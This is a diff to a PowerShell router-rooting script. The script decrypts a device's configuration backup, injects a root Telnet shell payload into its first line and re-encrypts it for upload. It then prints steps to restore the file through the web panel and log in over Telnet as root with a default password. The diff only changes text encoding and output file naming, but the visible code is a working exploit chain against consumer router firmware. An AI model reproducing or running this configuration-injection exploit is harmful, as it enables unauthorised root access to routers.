@@ -198,7 +198,7 @@ function Try-Decrypt([byte[]]$cipherBytes, [string]$hex) {
     $dec = $aes.CreateDecryptor()
     try {
         $plain = $dec.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
-        $str = [System.Text.Encoding]::ASCII.GetString($plain)
+        $str = [System.Text.Encoding]::GetEncoding(28591).GetString($plain)
         if ($str.StartsWith("config") -or $str.StartsWith("<?xml")) {
             return @{ Success = $true; Text = $str; PassBytes = $passBytes; Hex = $hex }
         }
@@ -255,7 +255,7 @@ Write-Host "  [2/3] Injecting root Telnet shell execution payload into Line 1...
 $lines = $plainText -split "`r?`n"
 $lines[0] = $UniversalPayload
 $modifiedText = $lines -join "`n"
-$modifiedBytes = [System.Text.Encoding]::ASCII.GetBytes($modifiedText)
+$modifiedBytes = [System.Text.Encoding]::GetEncoding(28591).GetBytes($modifiedText)
 
 Write-Host "  [3/3] Re-encrypting into ready-to-upload backup package..." -ForegroundColor Yellow
 $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
@@ -278,7 +278,10 @@ $outputList.AddRange($newCipher)
 
 $outDir = Split-Path -Parent $InputFile
 if (-not $outDir) { $outDir = "." }
-$outFile = [System.IO.Path]::Combine($outDir, "backup_root_ready.enc")
+$baseName = [System.IO.Path]::GetFileNameWithoutExtension($InputFile)
+$modelToken = ($selectedDevice.Name -split '\s+')[-1]
+if ($baseName -notmatch [regex]::Escape($modelToken)) { $baseName = "$baseName`_$modelToken" }
+$outFile = [System.IO.Path]::Combine($outDir, $baseName + "_MODIFIED.enc")
 [System.IO.File]::WriteAllBytes($outFile, $outputList.ToArray())
 
 Write-Host ""
@@ -289,7 +292,8 @@ Write-Host "====================================================================
 Write-Host ""
 Write-Host "  Next Steps to Achieve Root:" -ForegroundColor Cyan
 Write-Host "  1. In Router Web Panel, go to: Maintenance -> Backup/Restore" -ForegroundColor White
-Write-Host "  2. Under 'Restore', choose 'backup_root_ready.enc' and click Restore" -ForegroundColor White
+$outName = [System.IO.Path]::GetFileName($outFile)
+Write-Host "  2. Under 'Restore', choose '$outName' and click Restore" -ForegroundColor White
 Write-Host "  3. (Notice 'checksum error' in Web UI is normal & expected)" -ForegroundColor DarkGray
 Write-Host "  4. Connect via Telnet: telnet 192.168.29.1 23" -ForegroundColor Green
 Write-Host "     Username: root  |  Password: password" -ForegroundColor Green
